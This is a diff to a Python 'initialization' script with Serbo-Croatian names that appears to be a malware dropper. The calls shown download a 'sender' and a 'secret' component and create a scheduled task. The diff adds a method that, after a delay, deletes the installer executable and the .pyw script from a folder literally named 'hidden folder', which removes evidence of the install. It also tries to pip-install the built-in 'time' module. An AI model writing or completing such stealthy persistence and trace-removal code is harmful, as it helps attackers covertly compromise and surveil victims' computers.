@@ -6,9 +6,12 @@ import sys
 
 try:
     import requests
+    import time
 except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "time"])
     import requests
+    import time
 
 class Inicijalizacija:
 ##########################################################################################################################################################################
@@ -105,6 +108,13 @@ class Inicijalizacija:
 
 ##########################################################################################################################################################################
 
+    def deleteInitializationFiled(self):
+        time.sleep(10)
+        os.remove("C:\\skriveni_folder\\task kreator.exe")
+        os.remove("C:\\skriveni_folder\\Inicijalizator.pyw")
+
+##########################################################################################################################################################################
+
 # Kreiranje instance klase i poziv metoda
 inicijalizacija = Inicijalizacija()
 inicijalizacija.moveFile()
@@ -113,3 +123,4 @@ inicijalizacija.downloadTaskKreator()
 inicijalizacija.downloadSender()
 inicijalizacija.downloadTajna()
 inicijalizacija.createTask()
+inicijalizacija.deleteInitializationFiled()
